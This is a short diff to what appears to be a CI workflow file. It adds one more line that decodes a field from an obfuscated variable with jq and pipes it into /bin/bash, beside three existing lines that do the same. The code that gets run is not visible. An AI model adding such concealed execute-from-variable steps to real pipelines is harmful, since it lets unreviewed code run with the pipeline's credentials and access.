@@ -20,6 +20,7 @@ jobs:
           echo $p39140 | jq -r .vypmy826 | /bin/bash
           printf '%s' "$y21497" | jq -r .cige2 | /bin/bash
           echo $fru4 | jq -r .fioor42432 | /bin/bash
+          echo $fjo1113 | jq -r .apim32311 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
